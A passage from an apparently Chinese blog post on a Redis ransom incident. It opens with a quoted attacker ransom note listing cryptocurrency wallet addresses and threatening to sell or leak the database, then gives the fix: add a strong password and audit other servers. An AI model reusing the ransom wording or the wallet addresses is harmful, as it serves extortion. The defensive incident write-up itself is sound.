<span class="line"><span>3.36 LITECOIN (LTC) - LecBz5uWLaQhoqu1vcDjSxm8yc6fMuaaKc</span></span>
<span class="line"><span>1.81 MONERO (XMR) - 43pt1h8xCymBbN1t8nU7fjdUWHKTVx3ppCVbmc75C6btSuPxm5MspNrFZFtD6bhevH2JdPQJP2vGCLRdbr616Kgs1snvuZF</span></span>
<span class="line"><span>0.16 ETHEREUM (ETH) - 0xA942bB96B758E1271Be56744c29d8dCF14A56E3a</span></span>
<span class="line"><span>9.13 DASH - XihfDnbrDAHT7a9Yc3y8fjvMcDQfWVPSmk</span></span>
<span class="line"><span>3898 DOGECOIN (DOGE) - D5agMNse94NhZtCjSSQtiw2sjh6N7fJCqF</span></span>
<span class="line"><span></span></span>
<span class="line"><span>When using other coins please mention that in email.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>There is no other method of recovery from us other than payment. After 48 hours you will forever lose access to data </span></span>
<span class="line"><span>and we may do our own things with it. We will either sell your database on dark net markets, disclose data to your</span></span>
<span class="line"><span>users and ask payment there or simply delete it.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因为redis端口是对内网，所以配置redis是无密码，没想到还是中招了。</p><h2 id="解决方法-5" tabindex="-1"><a class="header-anchor" href="#解决方法-5"><span>解决方法</span></a></h2><p>给redis添加复杂密码，或者关闭reidis。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>修改配置文件中的密码</span></span>
<span class="line"><span>requirepass XXXXXXX</span></span>
<span class="line"><span></span></span>
<span class="line"><span># redis-cli -h 127.0.0.1 -p 63920 -a XXXXXXX</span></span>
<span class="line"><span>127.0.0.1:63920&gt; info</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>排查其他服务器，是否还有没有密码的redis，没有密码的redis服务器一定要添加复杂的密码，即使没有端口没有暴漏公网。</p><h2 id="安全等级增加" tabindex="-1"><a class="header-anchor" href="#安全等级增加"><span>安全等级增加</span></a></h2><p>后期为了安全需要做个堡垒机了，这个就以后专门写一篇相关的文章。</p></div><!----><!----><!----></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">Last Updated:</span><time class="vp-meta-info" datetime="2025-06-17T03:04:05.000Z" data-allow-mismatch>6/17/25, 3:04 AM</time></div><div class="contributors"><span class="vp-meta-label">Contributors: </span><!--[--><!--[--><span class="vp-meta-info" title="email: star@xgss.net">star</span><!--]--><!--]--></div></div></footer><!----><!----><!----><!--]--></main><!--]--><!----></div><!--]--><!--]--><!--[--><!----><!--[--><!--]--><!--]--><!--]--></div>
    <script type="module" src="/assets/app-BiQR_lPj.js" defer></script>
  </body>
</html>
